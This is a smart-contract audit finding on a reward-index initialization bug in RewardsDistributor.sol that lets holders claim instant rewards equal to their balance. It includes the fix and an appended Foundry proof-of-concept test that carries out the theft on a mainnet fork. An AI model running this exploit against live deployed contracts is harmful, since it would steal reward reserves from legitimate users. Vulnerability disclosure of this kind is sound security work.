### Title
Permissionless reward-index update can mint instant unclaimed rewards - (File: `contracts/RewardsDistributor.sol`)

### Summary
`RewardsDistributor.updateBeforeMintOrBurn()` and `updateBeforeTransfer()` are publicly callable for any account and only require `tokenStates[token_].index > 0`. When reward speed is first enabled, the token index is initialized to `INITIAL_INDEX`, but `_calculateTokenDelta()` only backfills a missing account index when the token index is strictly greater than `INITIAL_INDEX`. During the activation timestamp, an account with a pre-existing deposit/debt-token balance receives `balance * INITIAL_INDEX / 1e18`, equal to its full balance, as instantly accrued rewards.

### Finding Description
`_updateTokenSpeed()` initializes a newly rewarded token with `index = INITIAL_INDEX` and the current timestamp. For an account whose `accountIndexOf[token_]` is still zero, `_calculateTokenDelta()` fails to initialize that account index because the equality case is not handled:

```solidity
if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}
```

Therefore, when `_tokenIndex == INITIAL_INDEX`, `_deltaIndex` remains `1e18`, and `token_.balanceOf(account_).wadMul(_deltaIndex)` credits the account with rewards equal to its entire token balance. The attacker can trigger this through the public `updateBeforeTransfer()` function and then withdraw the credited amount through `claimRewards()`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
An attacker who acquires a deposit-token or debt-token balance before reward activation can front-run or immediately follow the routine `updateTokenSpeed()` transaction and claim approximately one reward-token unit per share-token unit. `claimRewards()` transfers the accrued amount to that account whenever the distributor has sufficient reward-token balance, allowing theft of reward reserves or unclaimed yield allocated to legitimate users. [4](#0-3) [5](#0-4) 

### Likelihood Explanation
The attack window is narrow: the token must transition from no reward speed to a nonzero speed while the attacker already holds the rewarded token, and the attacker must update or claim before the token index advances. This is still reachable by an unprivileged user because both index-update functions and claiming are public, and governance reward activations are predictable events that can be front-run or bundled in the same block. [2](#0-1) [6](#0-5) 

### Recommendation
Initialize a missing account index for the equality case as well:

```solidity
if (_accountIndex == 0 && _tokenIndex >= INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}
```

This preserves the intended behavior that pre-existing holders earn rewards from activation forward while preventing instant one-to-one accrual at activation. As defense in depth, the update hooks should also require `msg.sender == address(token_)` and verify that `token_` remains a registered `DepositToken` or `DebtToken`, since the comment that anyone may update indexes is not necessary for correct reward accounting.     function testInstantAccrualAtSpeedActivation() external {
        uint256 fork = vm.createFork(vm.envString("MAINNET_NODE_URL"));
        vm.selectFork(fork);
        vm.rollFork(vm.envUint("MAINNET_BLOCK_NUMBER"));

        IPool pool = IPool(vm.envAddress("POOL_PROXY"));
        IDepositToken depositToken = IDepositToken(pool.getDepositTokens()[0]);
        IERC20 collateral = depositToken.underlying();
        IERC20 rewardToken = IERC20(vm.envAddress("REWARD_TOKEN"));

        // Routine deployment/configuration setup for a production distributor.
        RewardsDistributor implementation = new RewardsDistributor();
        RewardsDistributor distributor = RewardsDistributor(
            address(
                new ERC1967Proxy(
                    address(implementation),
                    abi.encodeCall(RewardsDistributor.initialize, (pool, rewardToken))
                )
            )
        );

        address governor = IGovernable(address(pool)).governor();
        vm.prank(governor);
        pool.addRewardsDistributor(IRewardsDistributor(address(distributor)));

        // The unprivileged attacker obtains rewarded shares before speed activation.
        address attacker = makeAddr("attacker");
        uint256 amount = 1e18;
        deal(address(collateral), attacker, amount);

        vm.startPrank(attacker);
        collateral.approve(address(depositToken), amount);
        depositToken.deposit(amount, attacker);
        vm.stopPrank();

        uint256 shares = depositToken.balanceOf(attacker);
        deal(address(rewardToken), address(distributor), shares);

        // Routine governor action: enable rewards for an already-held token.
        vm.prank(governor);
        distributor.updateTokenSpeed(IERC20(address(depositToken)), 1e18);

        // Attack: write the initial index boundary through the public hook.
        IERC20[] memory rewardedTokens = new IERC20[](1);
        rewardedTokens[0] = IERC20(address(depositToken));

        vm.startPrank(attacker);
        distributor.updateBeforeTransfer(rewardedTokens[0], attacker, attacker);
        distributor.claimRewards(attacker, rewardedTokens);
        vm.stopPrank();

        assertEq(rewardToken.balanceOf(attacker), shares);
    }
}
